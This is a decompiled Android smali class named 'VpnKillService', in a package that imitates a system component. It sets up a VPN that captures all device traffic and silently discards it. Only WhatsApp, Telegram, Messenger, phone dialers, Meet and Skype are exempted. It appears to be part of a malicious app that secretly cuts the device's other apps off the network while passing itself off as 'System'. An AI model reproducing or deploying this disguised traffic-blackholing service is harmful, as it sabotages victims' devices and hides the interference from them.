.class public Lcom/android/system/qspaas/VpnKillService;
.super Landroid/net/VpnService;
.source "SourceFile"


# static fields
.field public static b:Lcom/android/system/qspaas/VpnKillService;


# instance fields
.field public a:Landroid/os/ParcelFileDescriptor;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/net/VpnService;-><init>()V

    return-void
.end method

.method public static synthetic a(Ljava/io/FileDescriptor;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/android/system/qspaas/VpnKillService;->c(Ljava/io/FileDescriptor;)V

    return-void
.end method

.method public static b()V
    .locals 2

    .line 1
    sget-object v0, Lcom/android/system/qspaas/VpnKillService;->b:Lcom/android/system/qspaas/VpnKillService;

    if-eqz v0, :cond_1

    :try_start_0
    iget-object v0, v0, Lcom/android/system/qspaas/VpnKillService;->a:Landroid/os/ParcelFileDescriptor;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/os/ParcelFileDescriptor;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_0
    :try_start_1
    sget-object v0, Lcom/android/system/qspaas/VpnKillService;->b:Lcom/android/system/qspaas/VpnKillService;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/app/Service;->stopForeground(Z)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :try_start_2
    sget-object v0, Lcom/android/system/qspaas/VpnKillService;->b:Lcom/android/system/qspaas/VpnKillService;

    invoke-virtual {v0}, Landroid/app/Service;->stopSelf()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    const/4 v0, 0x0

    sput-object v0, Lcom/android/system/qspaas/VpnKillService;->b:Lcom/android/system/qspaas/VpnKillService;

    :cond_1
    return-void
.end method

.method public static synthetic c(Ljava/io/FileDescriptor;)V
    .locals 2

    .line 1
    :try_start_0
    new-instance v0, Ljava/io/FileInputStream;

    invoke-direct {v0, p0}, Ljava/io/FileInputStream;-><init>(Ljava/io/FileDescriptor;)V

    const p0, 0x8000

    new-array p0, p0, [B

    :cond_0
    invoke-virtual {v0, p0}, Ljava/io/FileInputStream;->read([B)I

    move-result v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-gez v1, :cond_0

    :catch_0
    return-void
.end method


# virtual methods
.method public onDestroy()V
    .locals 0

    invoke-static {}, Lcom/android/system/qspaas/VpnKillService;->b()V

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 4

    sput-object p0, Lcom/android/system/qspaas/VpnKillService;->b:Lcom/android/system/qspaas/VpnKillService;

    const/4 p1, 0x2

    :try_start_0
    new-instance p2, Landroid/net/VpnService$Builder;

    invoke-direct {p2, p0}, Landroid/net/VpnService$Builder;-><init>(Landroid/net/VpnService;)V

    const-string p3, "10.0.0.2"

    const/16 v0, 0x20

    invoke-virtual {p2, p3, v0}, Landroid/net/VpnService$Builder;->addAddress(Ljava/lang/String;I)Landroid/net/VpnService$Builder;

    const-string p3, "fd00::2"

    const/16 v0, 0x80

    invoke-virtual {p2, p3, v0}, Landroid/net/VpnService$Builder;->addAddress(Ljava/lang/String;I)Landroid/net/VpnService$Builder;

    const-string p3, "0.0.0.0"

    const/4 v0, 0x0

    invoke-virtual {p2, p3, v0}, Landroid/net/VpnService$Builder;->addRoute(Ljava/lang/String;I)Landroid/net/VpnService$Builder;

    const-string p3, "::"

    invoke-virtual {p2, p3, v0}, Landroid/net/VpnService$Builder;->addRoute(Ljava/lang/String;I)Landroid/net/VpnService$Builder;

    const-string p3, "10.0.0.1"

    invoke-virtual {p2, p3}, Landroid/net/VpnService$Builder;->addDnsServer(Ljava/lang/String;)Landroid/net/VpnService$Builder;

    const-string p3, "System"

    invoke-virtual {p2, p3}, Landroid/net/VpnService$Builder;->setSession(Ljava/lang/String;)Landroid/net/VpnService$Builder;

    const/16 p3, 0x5dc

    invoke-virtual {p2, p3}, Landroid/net/VpnService$Builder;->setMtu(I)Landroid/net/VpnService$Builder;

    const/16 p3, 0xc

    new-array v1, p3, [Ljava/lang/String;

    const-string v2, "com.whatsapp"

    aput-object v2, v1, v0

    const-string v2, "com.whatsapp.w4b"

    const/4 v3, 0x1

    aput-object v2, v1, v3

    const-string v2, "com.gbwhatsapp"

    aput-object v2, v1, p1

    const-string v2, "org.telegram.messenger"

    const/4 v3, 0x3

    aput-object v2, v1, v3

    const-string v2, "org.telegram.messenger.web"

    const/4 v3, 0x4

    aput-object v2, v1, v3

    const-string v2, "com.facebook.orca"

    const/4 v3, 0x5

    aput-object v2, v1, v3

    const-string v2, "com.google.android.dialer"

    const/4 v3, 0x6

    aput-object v2, v1, v3

    const-string v2, "com.android.dialer"

    const/4 v3, 0x7

    aput-object v2, v1, v3

    const-string v2, "com.samsung.android.dialer"

    const/16 v3, 0x8

    aput-object v2, v1, v3

    const-string v2, "com.miui.voiceassist"

    const/16 v3, 0x9

    aput-object v2, v1, v3

    const-string v2, "com.google.android.apps.meetings"

    const/16 v3, 0xa

    aput-object v2, v1, v3

    const-string v2, "com.skype.raider"

    const/16 v3, 0xb

    aput-object v2, v1, v3

    :goto_0
    if-ge v0, p3, :cond_0

    aget-object v2, v1, v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :try_start_1
    invoke-virtual {p2, v2}, Landroid/net/VpnService$Builder;->addDisallowedApplication(Ljava/lang/String;)Landroid/net/VpnService$Builder;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_0
    :try_start_2
    invoke-virtual {p2}, Landroid/net/VpnService$Builder;->establish()Landroid/os/ParcelFileDescriptor;

    move-result-object p2

    iput-object p2, p0, Lcom/android/system/qspaas/VpnKillService;->a:Landroid/os/ParcelFileDescriptor;

    if-eqz p2, :cond_1

    invoke-virtual {p2}, Landroid/os/ParcelFileDescriptor;->getFileDescriptor()Ljava/io/FileDescriptor;

    move-result-object p2

    new-instance p3, Ljava/lang/Thread;

    new-instance v0, Ld0;

    invoke-direct {v0, p2}, Ld0;-><init>(Ljava/io/FileDescriptor;)V

    invoke-direct {p3, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {p3}, Ljava/lang/Thread;->start()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    :catch_1
    :cond_1
    return p1
.end method
